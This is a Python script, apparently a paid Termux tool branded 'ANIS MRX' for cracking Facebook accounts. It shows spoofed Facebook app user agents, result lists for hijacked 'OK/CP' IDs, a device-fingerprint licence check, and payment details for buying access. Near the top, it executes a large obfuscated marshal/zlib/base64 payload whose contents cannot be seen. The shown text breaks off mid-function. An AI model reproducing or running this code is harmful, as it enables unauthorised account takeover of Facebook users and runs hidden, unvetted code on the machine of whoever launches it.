#####_____IMPORTANT-DATA_____#####
import os,base64,zlib,platform,sys,time
os.system("clear")
print('\x1b[1;92m [✓]  ANIS MRX... ')
os.system("pip uninstall urllib3 requests chardet idna certifi -y");os.system("pip install urllib3 requests chardet idna certifi")
try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess,marshal,zlib
	from string import *
	from concurrent.futures import ThreadPoolExecutor as tred
except:pass
import requests as r,os
#####_____Time-Date-Setup_____#####
import time
from datetime import date
from datetime import datetime
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#####_____Folder-Setup_____#####
try:
	os.makedirs('/sdcard/ANISMRX')
except:
		pass
#####_____PROTECT-DATA-CAPTURE-&-BYPASS_____#####
exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\xf34\x00\x00\x00\x97\x00d\x00\x84\x00Z\x00\x02\x00e\x01\x02\x00e\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x02S\x00)\x03c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x00\x00\x00\x03\x00\x00\x00\xf3\xd8\x00\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00d\x00d\x00d\x04\x85\x03\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00S\x00)\x05N\xda\x07marshal\xda\x04zlib\xda\x06base64\xe9\xff\xff\xff\xff)\x04\xda\n__import__\xda\x05loads\xda\ndecompress\xda\tb64decode)\x01\xda\x02__s\x01\x00\x00\x00 \xfa\x01 \xfa\x08<lambda>r\r\x00\x00\x00\x01\x00\x00\x00sY\x00\x00\x00\x80\x00\x95\n\x989\xd1\x10%\xd4\x10%\xd7\x10+\xd2\x10+\xadJ\xb0v\xd1,>\xd4,>\xd7,I\xd2,I\xcd*\xd0U]\xd1J^\xd4J^\xd7Jh\xd2Jh\xd0ik\xd0lp\xd0lp\xd0np\xd0lp\xd4iq\xd1Jr\xd4Jr\xd1,s\xd4,s\xd1\x10t\xd4\x10t\x80\x00\xf3\x00\x00\x00\x00s4#\x00\x00=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)\x02\xda\x01_\xda\x04exec\xa9\x00r\x0e\x00\x00\x00r\x0c\x00\x00\x00\xfa\x08<module>r\x12\x00\x00\x00\x01\x00\x00\x00sY\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x04t\xd0\x04t\x80\x01\xd0uy\xd0uy\xd0{|\xd0{|\xf0\x00\x00\x7f\x01vN\x02\xf1\x00\x00{\x01wN\x02\xf4\x00\x00{\x01wN\x02\xf1\x00\x00v\x01xN\x02\xf4\x00\x00v\x01xN\x02\xf0\x00\x00v\x01xN\x02\xf0\x00\x00v\x01xN\x02\xf0\x00\x00v\x01xN\x02r\x0e\x00\x00\x00'))
#####_____METHOD-1-UA_____#####
def M1():
	ua = random.choice(["Mozilla/5.0 (Linux; Android 13; M2102J20SG Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/0.1 Chrome/119.0.6045.17 Mobile Safari/537[FB_IAB/FB4A;FBAV/436.0.0.35.101;]","Mozilla/5.0 (Linux; Android 13; SM-M336K Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]","Mozilla/5.0 (Linux; Android 13; SM-M336K Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]","Mozilla/5.0 (Linux; Android 13; SM-M336K Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]","Mozilla/5.0 (Linux; Android 13; SM-M336K Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]","Mozilla/5.0 (Linux; Android 13; SM-M336K Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]"])                                           
	return ua	
#####_____METHOD-2-UA_____#####
def M2():
	ua = random.choice(["Mozilla/5.0 (Linux; Android 13; SM-M336K Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/0.1 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]","Mozilla/5.0 (Linux; Android 13; SM-M336K Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/0.1 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]","Mozilla/5.0 (Linux; Android 13; SM-M336K Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]","Mozilla/5.0 (Linux; Android 13; SM-M336K Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]","Mozilla/5.0 (Linux; Android 13; SM-M336K Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]"])
	return ua
#####_____METHOD-3-UA_____#####
def M3():
	ua = random.choice(["Mozilla/5.0 (Linux; Android 13; M2102J20SG Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/0.1 Chrome/119.0.6045.17 Mobile Safari/537[FB_IAB/FB4A;FBAV/436.0.0.35.101;]","Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/436.0.0.35.101;]","Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/436.0.0.35.101;]","Mozilla/5.0 (Linux; Android 13; SM-M336K Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]","Mozilla/5.0 (Linux; Android 13; SM-M336K Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]","Mozilla/5.0 (Linux; Android 13; SM-M336K Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]","Mozilla/5.0 (Linux; Android 13; SM-M336K Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]","Mozilla/5.0 (Linux; Android 13; SM-M336K Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]"])
	return ua
#####_____EXTRA_____#####
SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"
ses = requests.Session()
##______COLORS____ARE________######
pwx=[]
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
N = '\x1b[0m'
PURPLE ='\x1b[38;5;46m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
EXTRA ='\x1b[38;5;208m'
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
#________________________________________#
sys.stdout.write('\x1b]2; ANIS MRX XD:)\x07')
logo=(f"""{WHITE}
█▀▀█ █▀▀▄ ░▀░ █▀▀   █▀▄▀█ █▀▀█ █░█
█▄▄█ █░░█ ▀█▀ ▀▀█   █░▀░█ █▄▄▀ ▄▀▄
▀░░▀ ▀░░▀ ▀▀▀ ▀▀▀   ▀░░░▀ ▀░▀▀ ▀░▀
                                             
                                           {WHITE}X {RED}ANIS\x1b[1;92mDIK {WHITE}
\033[1;37m ================================================
 [•] Owner    : MRX XD
 [•] GitHub   : ANIS  & MRX
 [•] Status   :nik mok hh
 [•] Version  : \033[1;32m4.5
\033[1;37m ================================================
{W} [•]{G} NOTE     {W}:{G} OK/CP IDZ SAVED IN ANIS FOLDER
\033[1;37m ================================================""")
#####_____Def-Line_____#####
def line():
    print('\033[1;37m ================================================')
#####_____Def-Clear_____#####
def clear():
        os.system('clear')
        print(logo)
#####_____Key-Setup_____#####
import pycurl
from io import BytesIO
def get_response(url):
    response_buffer = BytesIO()
    curl = pycurl.Curl()
    curl.setopt(curl.URL, url)
    curl.setopt(curl.WRITEDATA, response_buffer)
    try:
        curl.perform()
    except pycurl.error as e:
        return f"Error: {e}"
    response = response_buffer.getvalue().decode('utf-8')
    curl.close()
    return response
def remove_symbols_and_spaces(input_string):
    cleaned_string = re.sub(r'[^a-zA-Z0-9#]', '', input_string)
    return cleaned_string    
def approval():
  os.system('clear')
  print(logo)
  import platform
  uuid = str(os.geteuid())+"#"+ platform.uname().machine+platform.uname().version+platform.uname().release
  id = remove_symbols_and_spaces(uuid)
  k1,k2,k3,k4=id[:4],id[3:6],id[4:9],id[9:]
  intuid=int(id.split("#")[0])
  pref=str((intuid-104729)*2-37+(1-2**7))
  suff=str((intuid-523217)%104729)
  realid=(suff+k3+k1+k4+k2+pref).encode().hex()
  try:
    DARK=requests.get("https://github.com/Anismrx/anis_mrx.git").text
    if id in DARK:
      print(f"{GREEN} YOUR KEY IS APPROVED.")
      time.sleep(0.2)
      clear()
      msg = str(os.geteuid())
      pass
    else:
      print(f"{G} YOUR KEY :{W}  " +id)
      line()
      print(f"{G} NOTE    :    WELCOME TO ANIS LACHACHE TOOL")
      line()
      print(f"{W} TOOL IS PAID YOU HAVE TO\n PAY FOR APPROVAL .")
      line()
      print(f" {G}For Pakistan ==={W} Easypaise : {G}03316010290")
      print(f" {G}For Pakistan ==={W} Jazzcash  : {G}03316010290")
      print(f" {W}Rs.350 For 15 Days")
      print(f" {W}Rs.500 For 1 Month")
      print(f" {G}For Other Countries ==={W} Binance : {G}204128772")
      print(f" {W}6$ For 15 Days")
      print(f" {W}10$ For 1 Month")
      print(f" {W}COPY YOUR KEY SEND TO ADMIN FOR APPROVAL")
